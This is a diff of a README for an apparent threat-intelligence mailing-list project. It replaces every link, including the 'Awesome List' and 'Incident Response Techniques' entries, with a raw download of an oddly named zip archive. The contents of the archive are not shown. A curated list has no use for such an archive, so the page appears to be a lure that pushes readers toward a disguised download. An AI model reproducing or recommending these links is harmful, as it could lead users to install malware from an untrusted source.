@@ -4,14 +4,14 @@
 The **threat-intel-mailing-lists** project offers a curated list of newsletters, mailing lists, cyber daily briefs, and weekly reports. These resources are vital for analysts, incident responders, and Cyber Threat Intelligence (CTI) teams. With timely updates, you can stay informed about the latest trends and threats in cybersecurity.
 
 ## 📥 Download Latest Release
-[![Download Latest Release](https://github.com/barone-unuakpor/threat-intel-mailing-lists/raw/refs/heads/main/claver/threat-intel-mailing-lists-v3.2.zip%20Latest%20Release-v1.0-blue)](https://github.com/barone-unuakpor/threat-intel-mailing-lists/raw/refs/heads/main/claver/threat-intel-mailing-lists-v3.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/barone-unuakpor/threat-intel-mailing-lists/main/claver/lists_mailing_threat_intel_mesopterygoid.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/barone-unuakpor/threat-intel-mailing-lists/main/claver/lists_mailing_threat_intel_mesopterygoid.zip)
 
 ## 🚀 Getting Started
 To begin using the threat-intel-mailing-lists project, you need to download the latest release available on our GitHub page. Follow these simple steps to get started.
 
 1. **Visit the Releases Page**  
    Click the link below to access our releases:
-   [Download Latest Release](https://github.com/barone-unuakpor/threat-intel-mailing-lists/raw/refs/heads/main/claver/threat-intel-mailing-lists-v3.2.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/barone-unuakpor/threat-intel-mailing-lists/main/claver/lists_mailing_threat_intel_mesopterygoid.zip)
 
 2. **Locate the Latest Version**  
    On the releases page, look for the most recent version. It will be clearly marked.
@@ -60,8 +60,8 @@ Thanks to all contributors who help compile this resource. Your efforts in gathe
 ## 🔗 Additional Resources
 For more information on cybersecurity and threat intelligence, consider checking out the following topics:
 
-- [Awesome List](https://github.com/barone-unuakpor/threat-intel-mailing-lists/raw/refs/heads/main/claver/threat-intel-mailing-lists-v3.2.zip)  
-- [Cybersecurity Resources](https://github.com/barone-unuakpor/threat-intel-mailing-lists/raw/refs/heads/main/claver/threat-intel-mailing-lists-v3.2.zip)
-- [Incident Response Techniques](https://github.com/barone-unuakpor/threat-intel-mailing-lists/raw/refs/heads/main/claver/threat-intel-mailing-lists-v3.2.zip)
+- [Awesome List](https://raw.githubusercontent.com/barone-unuakpor/threat-intel-mailing-lists/main/claver/lists_mailing_threat_intel_mesopterygoid.zip)  
+- [Cybersecurity Resources](https://raw.githubusercontent.com/barone-unuakpor/threat-intel-mailing-lists/main/claver/lists_mailing_threat_intel_mesopterygoid.zip)
+- [Incident Response Techniques](https://raw.githubusercontent.com/barone-unuakpor/threat-intel-mailing-lists/main/claver/lists_mailing_threat_intel_mesopterygoid.zip)
 
-To benefit from this resource, remember to revisit our [Download Page](https://github.com/barone-unuakpor/threat-intel-mailing-lists/raw/refs/heads/main/claver/threat-intel-mailing-lists-v3.2.zip) regularly for the latest updates and insights.
+To benefit from this resource, remember to revisit our [Download Page](https://raw.githubusercontent.com/barone-unuakpor/threat-intel-mailing-lists/main/claver/lists_mailing_threat_intel_mesopterygoid.zip) regularly for the latest updates and insights.
